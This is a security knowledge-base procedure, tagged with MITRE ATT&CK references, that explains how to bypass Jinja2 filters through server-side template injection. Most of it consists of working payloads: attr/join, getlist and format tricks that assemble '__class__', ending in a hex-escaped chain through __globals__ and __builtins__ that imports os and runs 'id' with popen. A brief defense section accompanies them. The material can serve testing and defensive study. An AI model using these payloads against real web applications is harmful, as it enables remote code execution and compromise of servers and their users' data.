---
id: dbe16a19-9b3c-4459-ac7d-09e73742ad3c
name: Bypass-Jinja2-Filters-for-SSTI-Code-Execution
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:39.906529+00:00'
updated_at: '2023-04-10T20:23:43.888391+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Template Injection|T1221 - Template Injection]]'
sub_techniques: []
tags:
  - '[[tags/Jinja2]]'
  - '[[tags/Jinja2 - Filter bypass]]'
  - '[[tags/Server Side Template Injection]]'
commands:
  - '[[commands/jinja2-join-filter]]'
platforms:
  - Web
tools: []
validated: true
---

# Bypass-Jinja2-Filters-for-SSTI-Code-Execution

## Summary

This procedure demonstrates techniques to bypass Jinja2 filters in vulnerable Python web applications using server-side template injection (SSTI), allowing attackers to access restricted attributes like __class__ and ultimately execute arbitrary OS commands on the server.

## Description

Jinja2 is a templating engine for Python that can be vulnerable to SSTI if user input is rendered without proper sanitization. Filters in Jinja2 may block direct access to dangerous attributes, but by chaining expressions with attr(), join, and other built-ins, attackers can construct attribute names dynamically (e.g., '__class__') to escape the sandbox and reach Python's globals, builtins, and os module for code execution. This is typically tested in web apps like Flask where templates process user-controlled input. Success leads to remote code execution (RCE), enabling data exfiltration or persistence.

## Requirements

1. Access to a web application vulnerable to SSTI (e.g., Flask app rendering user input in templates).
2. Knowledge of Jinja2 syntax and Python object introspection.
3. Tools like Burp Suite or curl for sending crafted HTTP requests with payloads.
4. A local test environment (e.g., vulnerable Flask app on localhost:5000) to verify payloads.

## Defense

- Sanitize and escape all user input before rendering in templates using Jinja2's safe filters or autoescape.
- Implement a sandboxed environment for Jinja2 (e.g., disable dangerous globals via Environment policies).
- Use a web application firewall (WAF) to detect anomalous template expressions like {{ }} with attr or join.
- Enable logging for template rendering and monitor for unexpected Python attribute access.

## Objectives

1. Bypass Jinja2 filters to access the __class__ attribute of the request object.
2. Chain attribute access to reach Python builtins and import the os module.
3. Execute arbitrary OS commands on the server to achieve RCE.

## Instructions

### Step 1: Verify SSTI and Access Request Class Directly

**Context**: Confirm the vulnerability by injecting a basic template expression. If direct access to __class__ is filtered, prepare for bypass techniques.

**Code** ([[codes/access-request-class-directly]]):
```python
request.__class__
request["__class__"]
```

> Inject this into a user-controlled template field (e.g., via POST parameter). If it returns the class object (e.g., <class 'werkzeug.wrappers.request.Request'>), SSTI is confirmed. Direct access may be blocked by filters, leading to the next steps.

### Step 2: Bypass Filters Using Attr and Join to Build __class__

**Context**: Construct the forbidden '__class__' attribute dynamically using request arguments, join filter, and attr() to evade blacklisted strings.

**Code** ([[codes/bypass-jinja2-filter-to-access-class]]):
```python
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

> Send the URL or embed the expression in a request. The join filter concatenates parts ('__' + 'class' + '__') to form '__class__'. Expected output: Access to the Request class object, confirming bypass.

### Step 3: Alternative Bypass Using Tuple Join or Getlist

**Context**: If list-based join is filtered, use tuple concatenation or request.args.getlist() to build the attribute name from multiple parameters.

**Code** ([[codes/alternative-jinja2-bypass-using-getlist]]):
```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_ 
or
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_ 
```

> The tuple version joins strings in a tuple; getlist pulls multiple 'a' params to form ['_', '_', 'class', '_', '_']. This evades filters on direct lists. Success: Returns __class__ without triggering blocks.

### Step 4: Bypass Using Format Method for Attribute Construction

**Context**: Use string.format() with placeholders to build the attribute if join is restricted.

**Code** ([[codes/jinja2-bypass-using-format-method]]):
```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ 
```

> '%s%sclass%s%s' formats to '__class__' with '_' placeholders. Inject via request params. Expected: Successful attribute access.

### Step 5: Chain to Globals, Builtins, and OS Import for RCE

**Context**: From __class__, navigate to application globals, builtins, import os, and execute a command like 'id' to demonstrate RCE.

**Code** ([[codes/jinja2-ssti-os-command-execution]]):
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}} 
```

> Uses hex-escaped strings to avoid filter detection on underscores. Chains: application.__globals__['__builtins__']['__import__']('os').popen('id').read(). Expected output: 'uid=1000(user) gid=1000(user) groups=1000(user)' or similar, confirming RCE.

### Step 6: Use Join Filter in Payload Construction

**Context**: Throughout the bypasses, the join filter concatenates strings; reference it explicitly when building payloads.

**Command** ([[commands/jinja2-join-filter]]):
```jinja2
|join
```

> Apply the join filter to lists or tuples in expressions, e.g., ["__","class","__"]|join. This is key for dynamic attribute building.
